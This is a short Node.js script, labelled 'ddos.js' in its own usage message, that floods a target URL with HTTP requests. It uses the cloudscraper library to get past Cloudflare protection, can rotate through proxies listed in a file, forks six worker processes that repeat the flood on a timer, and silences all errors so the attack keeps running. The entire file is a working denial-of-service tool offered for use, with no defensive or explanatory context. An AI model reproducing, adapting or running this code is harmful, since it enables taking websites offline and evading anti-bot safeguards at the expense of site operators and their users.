const cluster = require("cluster")
const cloudscraper = require("cloudscraper")
const fs = require("fs")
if(process.argv.length !== 5){
console.log(`Bypass By Cung ! <3
node ddos.js url rate raw/proxy.txt`)
process.exit()
}else{
var url = process.argv[2];
var req = process.argv[3];
function raw(){
var option = {
url:url,
resolveWithFullResponse: true
}
let get = new Promise(function(resole,reject){
cloudscraper.get(option,function(err,res){
if(err){
return console.log("Server Error")}
var r  = res.request.headers
resole(r)
})
})
get.then(function(r){
for (let i=0;i<req;i++){
cloudscraper({
url:url,
headers:r,
followAllRedirects: false
},function(err,res){
if(err){
console.log(err.message)
}
console.log(res.statusCode)
})
}
})
}
}
function proxy(){
var xy = fs.readFileSync(process.argv[4],"utf-8",()=>{process.exit()}).split("\n")
var proxy = xy[Math.floor(Math.random()*xy.length)]
var head = new Promise(function(resolve,reject){
cloudscraper({url:url,resolveWithFullResponse: true,proxy:'http://'+proxy},function(err,res){
var result = res.request.headers
console.log(res.statusCode)
resolve(result)
})
})

head.then(function(result){
for (let g=0;g<req;g++){
cloudscraper({url:url,followAllRedirects: false,headers:result,proxy:proxy})
}
})





}
if(process.argv[4] == "raw"){
function rock(){
setInterval(()=>{
raw()
})}
async function vim(){
if(cluster.isMaster){
for (let u=0;u<6;u++){
cluster.fork()}
}
else{
rock()}

}
vim()
}
else if(process.argv[4] == process.argv[4]){
function th(){
setInterval(()=>{
proxy()
})}
async function main(){
if (cluster.isMaster){
for (let i=0;i<6;i++){
cluster.fork()}
}
else{
th()}}
main()
}
process.on('uncaughtException', function (err) {

});
process.on('unhandledRejection', function (err) {

});
